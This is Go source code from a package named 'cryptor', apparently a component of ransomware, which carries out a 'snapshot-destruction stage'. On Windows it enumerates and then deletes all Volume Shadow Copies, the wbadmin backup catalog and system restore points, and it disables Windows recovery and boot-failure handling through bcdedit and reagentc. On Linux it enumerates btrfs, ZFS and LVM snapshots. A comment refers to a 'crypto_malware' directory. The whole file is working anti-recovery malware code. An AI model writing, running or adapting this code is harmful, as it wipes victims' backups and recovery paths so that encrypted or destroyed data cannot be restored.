package cryptor

import (
	"context"
	"os/exec"
	"runtime"
	"strings"
	"time"
)

// ShadowOptions controls the snapshot-destruction stage.
type ShadowOptions struct {
	DryRun  bool          // enumerate only, execute nothing
	Timeout time.Duration // per-command timeout; default 60s
}

// ShadowResult is one command's outcome.
type ShadowResult struct {
	Label   string
	Cmd     string
	OK      bool
	Output  string
	Err     string
	Skipped bool // binary not on PATH
}

// ShadowRun is the full result of a destruction pass.
type ShadowRun struct {
	Platform string
	Commands []ShadowResult
	Elapsed  time.Duration
}

// command spec — label, argv
type cmdSpec struct {
	label string
	argv  []string
}

var windowsEnumCmds = []cmdSpec{
	{"vss shadows", []string{"vssadmin", "list", "shadows"}},
	{"wmic shadowcopies", []string{"wmic", "shadowcopy", "list", "brief"}},
	{"wbadmin versions", []string{"wbadmin", "get", "versions", "-backupTarget:C:", "-quiet"}},
}

var windowsKillCmds = []cmdSpec{
	{"vss delete all", []string{"vssadmin", "delete", "shadows", "/all", "/quiet"}},
	{"wmic shadowcopy delete", []string{"wmic", "shadowcopy", "delete"}},
	{"wbadmin delete catalog", []string{"wbadmin", "delete", "catalog", "-quiet"}},
	{"bcdedit recovery off", []string{"bcdedit", "/set", "{default}", "recoveryenabled", "No"}},
	{"bcdedit bootpolicy", []string{"bcdedit", "/set", "{default}", "bootstatuspolicy", "ignoreallfailures"}},
	{"reagentc disable", []string{"reagentc", "/disable"}},
	{"delete restore points", []string{"powershell", "-NoProfile", "-Command",
		"Get-ComputerRestorePoint | ForEach-Object { Remove-ComputerRestorePoint -RestorePointId $_.SequenceNumber -Confirm:$false }"}},
}

var linuxEnumCmds = []cmdSpec{
	{"btrfs subvolumes", []string{"btrfs", "subvolume", "list", "/"}},
	{"zfs snapshots", []string{"zfs", "list", "-t", "snapshot", "-H", "-o", "name"}},
	{"lvm snapshots", []string{"lvs", "-o", "lv_name,vg_name,lv_size,lv_attr"}},
}

// runCmd executes one command with a timeout and returns the result.
func runCmd(spec cmdSpec, timeout time.Duration) ShadowResult {
	r := ShadowResult{Label: spec.label, Cmd: strings.Join(spec.argv, " ")}
	path, err := exec.LookPath(spec.argv[0])
	if err != nil {
		r.Skipped = true
		r.Err = "not found: " + spec.argv[0]
		return r
	}
	ctx, cancel := context.WithTimeout(context.Background(), timeout)
	defer cancel()
	cmd := exec.CommandContext(ctx, path, spec.argv[1:]...)
	out, err := cmd.CombinedOutput()
	r.Output = string(out)
	if err != nil {
		r.Err = err.Error()
		if ctx.Err() != nil {
			r.Err = "timeout"
		}
		return r
	}
	r.OK = true
	return r
}

// DestroySnapshots runs the platform-appropriate snapshot destruction
// sequence. On Windows it enumerates then kills VSS, wbadmin catalog,
// restore points, and Windows RE. On Linux it enumerates btrfs/zfs/lvm
// snapshots only — the caller decides whether to run the destroy commands
// themselves (the deletion shapes vary per distro).
func DestroySnapshots(opts ShadowOptions) ShadowRun {
	var out ShadowRun
	start := time.Now()
	out.Platform = runtime.GOOS
	if opts.Timeout == 0 {
		opts.Timeout = 60 * time.Second
	}

	switch runtime.GOOS {
	case "windows":
		for _, spec := range windowsEnumCmds {
			out.Commands = append(out.Commands, runCmd(spec, opts.Timeout))
		}
		if opts.DryRun {
			for _, spec := range windowsKillCmds {
				r := ShadowResult{Label: spec.label, Cmd: strings.Join(spec.argv, " ")}
				if _, err := exec.LookPath(spec.argv[0]); err != nil {
					r.Skipped = true
					r.Err = "not found: " + spec.argv[0]
				}
				out.Commands = append(out.Commands, r)
			}
		} else {
			for _, spec := range windowsKillCmds {
				out.Commands = append(out.Commands, runCmd(spec, opts.Timeout))
			}
		}
	case "linux":
		for _, spec := range linuxEnumCmds {
			out.Commands = append(out.Commands, runCmd(spec, opts.Timeout))
		}
		// Linux destruction is operator-driven — see Program/crypto_malware/shadow.py
	default:
		// no-op on other platforms
	}

	out.Elapsed = time.Since(start)
	return out
}
